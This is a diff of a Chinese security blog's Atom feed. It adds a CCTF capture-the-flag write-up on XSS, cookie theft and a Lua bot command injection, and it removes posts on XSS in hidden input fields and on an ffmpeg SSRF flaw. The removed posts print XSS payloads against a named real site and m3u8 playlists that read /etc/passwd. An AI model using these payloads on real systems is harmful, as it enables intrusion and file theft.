@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-04-12T07:58:36.000Z</updated>
+  <updated>2016-05-03T08:16:35.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,6 +13,86 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[2016 CCTF writeup之萝莉之旅]]></title>
+    <link href="http://xdxd.love/2016/05/03/2016-CCTF%E4%B9%8B%E8%90%9D%E8%8E%89%E4%B9%8B%E6%97%85/"/>
+    <id>http://xdxd.love/2016/05/03/2016-CCTF之萝莉之旅/</id>
+    <published>2016-05-03T03:33:35.000Z</published>
+    <updated>2016-05-03T08:16:35.000Z</updated>
+    <content type="html"><![CDATA[<p><img src="/images/cctf4.png" alt=""></p>
+<h1 id="CCTF感受">CCTF感受</h1><p>周六花了一天时间做了下CCTF的pentest。还是有不少有意思的收获。这个名字叫pentest，而不是web，感觉也是花了心思的，感谢花时间精力准备的CCTF。loli1，loli2侥幸拿了一血，先装个逼。<br><img src="/images/cctf1.png" alt=""></p>
+<h1 id="loli之旅">loli之旅</h1><p>打开首页萌了一脸，羞羞的图片，果然是loli.club啊。右键看了一下源码，除了一个注释貌似没有啥其他的信息了。</p>
+<pre><code><span class="comment">&lt;!--
+powered by PockyNya
+诚招前端，请联系邮箱：pocky@loli.club
+--&gt;</span>
+</code></pre><p>google直接搜索PockyNya，找到其github。</p>
+<p><img src="/images/cctf2.png" alt=""></p>
+<p>分析第一个仓库pyprint:<br><img src="/images/cctf3.png" alt=""></p>
+<p>可以找到一个博客地址：<a href="http://pocky.loli.club:41293/" target="_blank" rel="external">http://pocky.loli.club:41293/</a></p>
+<p>有了网址和源码，自然是要对源码做一番审计。这里我其实是用了一个比较猥琐的方式快速找到了源码中的漏洞。<br>在PockNya的github主页上，可以看到他follow了一个人，RicterZ，点进去可以看到自然是这道题目的作者了。由于平时就关注了RicterZ的github和博客。在RicterZ的github也可以看到pyprint这个仓库，是自己博客的开源代码。所以接下来就是把两个仓库都clone下来，diff了一下。~~~</p>
+<p>其实对于pyprint这个代码的审计，读一下commit时的comment可以发现很多信息，比直接看代码可以省不少功夫。不过有了diff大法，一切都是浮云。<br><img src="/images/cctf6.png" alt=""></p>
+<h2 id="漏洞一">漏洞一</h2><p><img src="/images/cctf5.png" alt=""></p>
+<p>看到登录页面login多了一个flag参数，查看模板文件，直接输出在了页面中，存在一个反射XSS。</p>
+<pre><code>&lt;form class=<span class="string">"form-horizontal login-form"</span> role=<span class="string">"form"</span> action=<span class="string">"/login?flag="</span> <span class="keyword">method</span>=<span class="string">"post"</span>&gt;
+</code></pre><p><img src="/images/cctf7.png" alt=""></p>
+<p>反射XSS需要绕过浏览器audit，根据博客文章提示，找到xss地址之后，发到作者邮箱。试了一下才知道，这个XSS是个意外，很快就被修复了。</p>
+<p><img src="/images/cctf8.png" alt=""></p>
+<h2 id="漏洞二">漏洞二</h2><p><img src="/images/cctf9.png" alt=""></p>
+<p>发现addpost这个方法的权限验证去掉了。查看相关模板，发现去掉了urlencode编码。导致越权发布文章，文章内容可以存储型XSS。根据代码中的接口和参数拼接请求。发布存储型XSS文章。将地址发给作者邮箱，获得cookie。cookie中flag参数解码就是最终的flag。</p>
+<h2 id="漏洞三">漏洞三</h2><p><img src="/images/cctf10.png" alt=""></p>
+<p>FileReadHandler存在任意文件读取的漏洞，看到这里很开心，可是被注释掉了。所有是逗你玩的代码了~~<br><img src="/images/cctf11.png" alt=""></p>
+<h2 id="漏洞四">漏洞四</h2><p><img src="/images/cctf12.png" alt=""><br>这里其实也不算漏洞，看到不一样的代码就跟进去看看做了啥。查看日志的时候，验证了cookie。这里当时不记得怎么弄的了，xss打到的cookie早就加了进去，直接拼日志的地址就可以访问了。现在来看只要本地伪造一个cookie就可以绕过这个验证？添加cookie之后可以查看到一篇一个lua脚本的日志。</p>
+<p><img src="/images/cctf13.png" alt=""></p>
+<p>lua脚本源码：</p>
+<pre><code><span class="operator"><span class="keyword">do</span>
+<span class="keyword">local</span> <span class="keyword">function</span> run(msg, matches)
+  <span class="keyword">if</span> matches[<span class="number">1</span>] ~= <span class="string">'!minecraft'</span> <span class="keyword">then</span>
+    operation = matches[<span class="number">1</span>]
+  <span class="keyword">else</span>
+    <span class="keyword">return</span> <span class="string">"!minecraft start|stop|restart"</span>
+  <span class="keyword">end</span>
+  <span class="keyword">if</span> <span class="keyword">string</span>.find(operation, <span class="string">'&amp;'</span>) <span class="keyword">or</span> <span class="keyword">string</span>.find(operation, <span class="string">'|'</span>) <span class="keyword">or</span> <span class="keyword">string</span>.find(operation, <span class="string">'`'</span>) <span class="keyword">then</span>
+    <span class="keyword">return</span> <span class="string">"Invalid operation "</span> .. operation
+  <span class="keyword">end</span>
+  <span class="keyword">local</span> <span class="keyword">t</span> = io.popen(<span class="string">'cd /home/telegram &amp;&amp; ./mc '</span> .. operation)
+  <span class="keyword">local</span> a = <span class="keyword">t</span>:<span class="keyword">read</span>(<span class="string">"*all"</span>)
+  <span class="keyword">return</span> a
+<span class="keyword">end</span>
+<span class="keyword">return</span> {
+  description = <span class="string">"loli.club minecraft bot!"</span>,
+  <span class="keyword">usage</span> = <span class="string">"!minecraft start|stop|restart"</span>,
+  patterns = {
+    <span class="string">"^!minecraft$"</span>,
+    <span class="string">"^!minecraft (.*)$"</span>
+  },
+  run = run
+}
+<span class="keyword">end</span>%</span>
+</code></pre><p>比较明显的命令注入漏洞。参考<a href="http://drops.wooyun.org/papers/1018" target="_blank" rel="external">Shell Injection &amp; Command Injection</a>。没有过滤分号<code>;</code>。</p>
+<p>第一次用telegram，找到bot的账号花了一会时间。本身漏洞是比较典型的。</p>
+<p><img src="/images/cctf14.png" alt=""></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><img src="/images/cctf4.png" alt=""></p>
+<h1 id="CCTF感受">CCTF感受</h1><p>周六花了一天时间做了下CCTF的pentest。还是有不少有意思的收获。这个名字叫pentest，而不是web，感觉也是花了心思的，]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[使用shell和python分析大日志文件]]></title>
+    <link href="http://xdxd.love/2016/04/25/%E4%BD%BF%E7%94%A8shell%E5%92%8Cpython%E5%88%86%E6%9E%90%E5%A4%A7%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6/"/>
+    <id>http://xdxd.love/2016/04/25/使用shell和python分析大日志文件/</id>
+    <published>2016-04-25T07:49:37.000Z</published>
+    <updated>2016-04-25T07:49:37.000Z</updated>
+    <content type="html"></content>
+    <summary type="html">
+    
+    </summary>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[XSScookie利用工具cookie-hacker修改版]]></title>
@@ -823,96 +903,6 @@ class <sp]]>
       <category term="python" scheme="http://xdxd.love/tags/python/"/>
     
       <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[input标签type为hidden时的xss利用]]></title>
-    <link href="http://xdxd.love/2016/01/20/input%E6%A0%87%E7%AD%BEtype%E4%B8%BAhidden%E6%97%B6%E7%9A%84xss%E5%88%A9%E7%94%A8/"/>
-    <id>http://xdxd.love/2016/01/20/input标签type为hidden时的xss利用/</id>
-    <published>2016-01-20T06:05:01.000Z</published>
-    <updated>2016-01-20T06:45:54.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="问题场景">问题场景</h1><p>有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。</p>
-<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> name=<span class="string">"redacted"</span> value=<span class="string">"default"</span> injection=<span class="string">"xss"</span> /&gt;
-</code></pre><h1 id="结论">结论</h1><p>在某些条件下是可以执行javascript的，但是比较鸡肋。资料收集的结论就是利用价值极低。</p>
-<h1 id="利用方式">利用方式</h1><p>1，如果输出是在type=”hidden”之前，直接覆盖type，就变成了一个常规的xss。这个情况比较少见。</p>
-<p>2，建立两个HTML文件，one.htm</p>
-<pre><code><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">two.htm</span>&gt;</span>
-</code></pre><p>two.htm</p>
-<pre><code>&lt;<span class="tag">input</span> type=hidden style=x:<span class="function"><span class="title">expression</span><span class="params">(alert(<span class="number">1</span>)</span></span>)&gt;
-</code></pre><p>测试于IE6-9 可以弹。</p>
-<p>3，firefox使用键盘交互的方式。</p>
-<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> accesskey=<span class="string">"X"</span> onclick=<span class="string">"alert(1)"</span>&gt;
-</code></pre><p> Only works on Firefox. ALT+SHIFT+X on Windows/Linux, CTRL+ALT+X osx.</p>
-<p>4,使用expression</p>
-<p>IE6下</p>
-<pre><code>&lt;<span class="tag">input</span> type=hidden style=x:<span class="function"><span class="title">expression</span><span class="params">(alert(<span class="number">1</span>)</span></span>)&gt;
-</code></pre><h1 id="实例测试">实例测试</h1><pre><code><span class="keyword">http</span>://m.yohobuy.com/passport//back//backcode?phoneNum=15381187741&amp;token=a<span class="number">%20</span>accesskey=X<span class="number">%20</span>onclick=alert<span class="number">%281</span><span class="number">%29</span>&amp;areaCode=8
-</code></pre><p><img src="/images/inputhidden1.png" alt=""></p>
-<pre><code>http:<span class="regexp">//m</span>.yohobuy.com/passport//back//backcode?phoneNum=<span class="number">15381187741</span>&amp;token=e6fd9<span class="variable">%20style</span><span class="variable">%3dx</span><span class="variable">%3aexpr</span><span class="variable">%2f</span>**<span class="variable">%2fession</span>(<span class="keyword">open</span>(alert(<span class="number">1</span>)))<span class="variable">%20e6fd9</span>&amp;areaCode=<span class="number">8</span>
-</code></pre><p><img src="/images/inputhidden2.png" alt=""></p>
-<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/9856" target="_blank" rel="external">http://zone.wooyun.org/content/9856</a><br><a href="http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html" target="_blank" rel="external">http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<h1 id="问题场景">问题场景</h1><p>有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。</p>
-<pre><code>&lt;input <span cl]]>
-    </summary>
-    
-      <category term="xss" scheme="http://xdxd.love/tags/xss/"/>
-    
-      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[ffmpeg SSRF漏洞分析]]></title>
-    <link href="http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://xdxd.love/2016/01/18/ffmpeg-SSRF漏洞分析/</id>
-    <published>2016-01-18T10:41:41.000Z</published>
-    <updated>2016-03-15T07:03:03.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="漏洞预警">漏洞预警</h1><p>这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的<a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">这个文章</a>，但是俄语看不懂，google翻译也没看懂。中文的相关报道都是来自<a href="http://www.solidot.org/story?sid=46891" target="_blank" rel="external">solidot</a>15日的这个简短报道。<br><img src="/images/ffmpegssrf1.png" alt=""></p>
-<p>而ffmpeg得反应很快，1月16日就发布了修复版本。</p>
-<p><img src="/images/ffmpegssrf2.png" alt=""></p>
-<h1 id="漏洞影响">漏洞影响</h1><p>如果ffmpeg解析了一个恶意的文件，会导致本地的文件信息泄露。受影响的出了ctf中这个在线视频格式转换的服务外，如果是采用ffmpeg了客户端如果可以输入恶意文件也会造成本地文件信息泄露。</p>
-<h1 id="漏洞分析">漏洞分析</h1><p>change log中提到了两个CVE CVE-2016-1897和CVE-2016-1898。</p>
-<h2 id="CVE-2016-1897">CVE-2016-1897</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对concat的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#concat" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#concat</a> )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
-<pre><code><span class="preprocessor">#EXTM3U</span>
-<span class="preprocessor">#EXT-X-MEDIA-SEQUENCE:0</span>
-<span class="preprocessor">#EXTINF:10.0,</span>
-concat:http:<span class="comment">//dx.su/header.m3u8|file:///etc/passwd</span>
-<span class="preprocessor">#EXT-X-ENDLIST</span>
-</code></pre><h2 id="CVE-2016-1898">CVE-2016-1898</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a>  )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
-<pre><code><span class="comment">#EXTM3U</span>
-<span class="comment">#EXT-X-MEDIA-SEQUENCE:0</span>
-<span class="comment">#EXTINF:10.0,</span>
-<span class="symbol">concat:</span><span class="symbol">http:</span>/<span class="regexp">/localhost/header</span>.m3u8|subfile,,start,<span class="number">0</span>,<span class="keyword">end</span>,<span class="number">64</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">64</span>,<span class="keyword">end</span>,<span class="number">128</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">128</span>,<span class="keyword">end</span>,<span class="number">256</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">256</span>,<span class="keyword">end</span>,<span class="number">512</span>,,<span class="symbol">:///etc/passwd</span>
-<span class="comment">#EXT-X-ENDLIST</span>
-</code></pre><h1 id="CTF">CTF</h1><p>比较有意思的是查资料的过程中发现了这篇文章<a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter" target="_blank" rel="external">9447 CTF 2015: Super Turbo Atomic GIF Converter</a></p>
-<p>可以看到以下几个方式可以读取文件:</p>
-<pre><code><span class="id">#EXTM3U</span>
-<span class="id">#EXT-X-TARGETDURATION</span>:<span class="number">1</span>
-<span class="id">#EXTINF</span>:<span class="number">1</span>,
-/home/ctf/flag<span class="class">.txt</span>
-<span class="id">#EXT-X-ENDLIST</span>
-
-<span class="id">#EXTM3U</span>
-<span class="id">#EXT-X-PLAYLIST-TYPE</span>:VOD
-<span class="id">#EXT-X-TARGETDURATION</span>:<span class="number">1</span>
-<span class="id">#EXT-X-VERSION</span>:<span class="number">3</span>
-<span class="id">#EXT-X-MEDIA-SEQUENCE</span>:<span class="number">0</span>
-<span class="id">#EXTINF</span>:<span class="number">10.0</span>,
-file:<span class="comment">///home/ctf/flag.txt</span>
-#EXT-X-ENDLIST
-</code></pre><p>以及这里cve的concat方式。利用0day做ctf也是高端。</p>
-<h1 id="参考资料">参考资料</h1><p><a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">通过 ffmpeg 的播放列表实现 SSRF 以及窃取文件</a><br><a href="http://seclists.org/oss-sec/2016/q1/85" target="_blank" rel="external">http://seclists.org/oss-sec/2016/q1/85</a><br><a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1897" target="_blank" rel="external">http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1897</a><br><a href="https://www.ffmpeg.org/ffmpeg-protocols.html#concat" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#concat</a><br><a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a><br><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter" target="_blank" rel="external">https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter</a><br><a href="http://www.kernelpicnic.net/2015/11/29/9447CTF-Super-Turbo-Atomic-GIF-Converter-Write-Up.html" target="_blank" rel="external">http://www.kernelpicnic.net/2015/11/29/9447CTF-Super-Turbo-Atomic-GIF-Converter-Write-Up.html</a><br><a href="https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web180-gif-converter" target="_blank" rel="external">https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web180-gif-converter</a><br><a href="http://pastebin.com/FrsQinQz" target="_blank" rel="external">http://pastebin.com/FrsQinQz</a><br><a href="https://gist.github.com/Invizory/e45e1ee54cf0687f2002" target="_blank" rel="external">https://gist.github.com/Invizory/e45e1ee54cf0687f2002</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<h1 id="漏洞预警">漏洞预警</h1><p>这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的<a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">]]>
-    </summary>
-    
-      <category term="ffmpeg" scheme="http://xdxd.love/tags/ffmpeg/"/>
-    
-      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
